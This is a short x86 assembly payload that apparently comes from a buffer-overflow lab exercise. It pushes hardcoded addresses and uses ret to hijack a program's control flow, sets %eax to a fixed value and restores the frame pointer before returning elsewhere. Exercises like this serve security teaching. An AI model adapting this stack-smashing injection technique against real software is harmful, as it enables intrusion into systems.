sub $0xc8, %esp
pushl $0x0804c0c0 #push Unique File
pushl $0x5568325c #counted address 48 32 68 55
pushl $0x08048de3  #push create File address
ret
movl $0x35343059, %eax
movl $0x556832c0, %ebp
add $0xcc, %esp
pushl $0x08048e2c
ret

